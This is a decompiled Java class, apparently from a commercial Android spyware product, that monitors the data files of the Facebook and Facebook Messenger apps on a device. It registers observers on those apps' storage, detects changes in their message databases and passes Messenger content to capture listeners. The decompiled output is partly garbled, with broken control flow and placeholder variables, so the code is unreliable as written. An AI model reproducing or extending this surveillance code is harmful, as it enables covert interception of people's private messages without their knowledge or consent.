package com.vvt.capture.b.b;

import com.vvt.base.capture.h;
import com.vvt.capture.b.d;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class b
  implements com.vvt.n.a.a
{
  private static final boolean a = com.vvt.ak.a.e;
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.b;
  private static b h;
  private String d;
  private d e;
  private Thread f;
  private com.vvt.n.a.b g;
  private HashSet i;
  private boolean j;
  private String k;
  
  private b(com.vvt.n.a.b paramb, String paramString1, String paramString2)
  {
    this.g = paramb;
    this.j = false;
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.i = localHashSet;
    this.d = paramString1;
    this.k = paramString2;
  }
  
  public static b a(com.vvt.n.a.b paramb, String paramString1, String paramString2)
  {
    synchronized (b.class)
    {
      b localb = h;
      if (localb == null)
      {
        localb = new com/vvt/capture/b/b/b;
        localb.<init>(paramb, paramString1, paramString2);
        h = localb;
      }
      localb = h;
      return localb;
    }
  }
  
  private void b()
  {
    boolean bool1 = true;
    boolean bool2 = false;
    ??? = null;
    Object localObject2;
    try
    {
      bool3 = b;
      if (bool3) {}
      localObject1 = "com.facebook.katana";
      localObject1 = com.vvt.capture.b.a.a.a((String)localObject1);
      localObject2 = this.d;
      localObject2 = e.c((String)localObject2);
      localObject3 = this.d;
      localObject3 = e.e((String)localObject3);
      String str1 = this.k;
      localObject1 = e.a((String)localObject1, (String)localObject2, (String)localObject3, str1);
      localObject2 = "com.facebook.orca";
      localObject2 = com.vvt.capture.b.a.a.a((String)localObject2);
      localObject3 = this.d;
      localObject3 = e.d((String)localObject3);
      str1 = this.d;
      str1 = e.e(str1);
      String str2 = this.k;
      localObject2 = e.a((String)localObject2, (String)localObject3, str1, str2);
      int m = com.vvt.capture.b.c.a.b.a((String)localObject2);
      boolean bool5 = b;
      if ((bool5) && (m != 0)) {
        break label408;
      }
      localObject2 = com.vvt.capture.b.a.a.a((String)localObject1, (String)localObject2);
      if (localObject2 == null) {
        break label386;
      }
      localObject1 = this.e;
      if (localObject1 == null)
      {
        this.e = ((d)localObject2);
        if (!bool1) {
          break label386;
        }
        bool1 = c;
        if (bool1) {}
        synchronized (this.i)
        {
          Object localObject4 = this.i;
          localObject1 = ((HashSet)localObject4).iterator();
          bool1 = ((Iterator)localObject1).hasNext();
          if (!bool1) {
            break label384;
          }
          localObject4 = ((Iterator)localObject1).next();
          localObject4 = (h)localObject4;
          ((h)localObject4).a();
        }
      }
      localObject1 = ((d)localObject2).g();
    }
    finally {}
    Object localObject3 = this.e;
    localObject3 = ((d)localObject3).g();
    boolean bool4 = ((String)localObject1).equals(localObject3);
    boolean bool3 = b;
    if (bool3) {}
    long l1 = ((d)localObject2).h();
    Object localObject1 = this.e;
    long l2 = ((d)localObject1).h();
    bool3 = l1 < l2;
    label341:
    Object localObject7;
    if (bool3)
    {
      bool3 = bool1;
      if (!bool4) {
        break label371;
      }
      bool1 = false;
      localObject7 = null;
    }
    for (;;)
    {
      bool2 = b;
      if (!bool2) {
        break;
      }
      break;
      bool3 = false;
      localObject1 = null;
      break label341;
      label371:
      if (!bool3)
      {
        bool1 = false;
        localObject7 = null;
      }
    }
    for (;;)
    {
      label384:
      label386:
      localObject7 = this.d;
      e.b((String)localObject7);
      bool1 = b;
      if (bool1) {}
      return;
      label408:
      bool1 = c;
      if (bool1) {}
      synchronized (this.i)
      {
        localObject7 = this.i;
        localObject1 = ((HashSet)localObject7).iterator();
        bool1 = ((Iterator)localObject1).hasNext();
        if (bool1)
        {
          localObject7 = ((Iterator)localObject1).next();
          localObject7 = (h)localObject7;
          ((h)localObject7).a();
        }
      }
    }
  }
  
  public void a(h paramh)
  {
    boolean bool = b;
    if (bool) {}
    synchronized (this.i)
    {
      Object localObject2 = this.i;
      bool = ((HashSet)localObject2).contains(paramh);
      if (!bool)
      {
        localObject2 = this.i;
        ((HashSet)localObject2).add(paramh);
      }
      bool = this.j;
      if (bool) {
        break label143;
      }
      bool = true;
      this.j = bool;
      localObject2 = this.g;
      if (localObject2 != null)
      {
        localObject2 = com.vvt.capture.b.a.a.a();
        ??? = ((List)localObject2).iterator();
        bool = ((Iterator)???).hasNext();
        if (!bool) {
          break label143;
        }
        localObject2 = (String)((Iterator)???).next();
        com.vvt.n.a.b localb = this.g;
        localb.a((String)localObject2, this);
      }
    }
    bool = a;
    if (bool) {}
    label143:
    bool = b;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    boolean bool = b;
    if (bool) {}
    Thread localThread = this.f;
    if (localThread == null)
    {
      localThread = new java/lang/Thread;
      c localc = new com/vvt/capture/b/b/c;
      localc.<init>(this);
      localThread.<init>(localc);
      this.f = localThread;
      localThread = this.f;
      localThread.start();
    }
    bool = b;
    if (bool) {}
  }
  
  public void b(h paramh)
  {
    boolean bool1 = b;
    if (bool1) {}
    synchronized (this.i)
    {
      Object localObject2 = this.i;
      bool1 = ((HashSet)localObject2).contains(paramh);
      if (bool1)
      {
        localObject2 = this.i;
        ((HashSet)localObject2).remove(paramh);
      }
      localObject2 = this.i;
      int m = ((HashSet)localObject2).size();
      boolean bool3 = b;
      if ((!bool3) || (m == 0))
      {
        bool2 = this.j;
        if (bool2)
        {
          bool2 = false;
          this.j = false;
          localObject2 = this.g;
          if (localObject2 != null)
          {
            localObject2 = com.vvt.capture.b.a.a.a();
            ??? = ((List)localObject2).iterator();
            bool2 = ((Iterator)???).hasNext();
            if (bool2)
            {
              localObject2 = (String)((Iterator)???).next();
              com.vvt.n.a.b localb = this.g;
              localb.a((String)localObject2);
            }
          }
        }
      }
    }
    boolean bool2 = b;
    if (bool2) {}
  }
  
  public void c(String paramString)
  {
    boolean bool = b;
    if (bool) {}
    Object localObject = this.i;
    Iterator localIterator = ((HashSet)localObject).iterator();
    for (;;)
    {
      bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      localObject = (h)localIterator.next();
      String str = "com.facebook.orca";
      ((h)localObject).a(str, paramString);
    }
    bool = b;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/removeFromPath/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */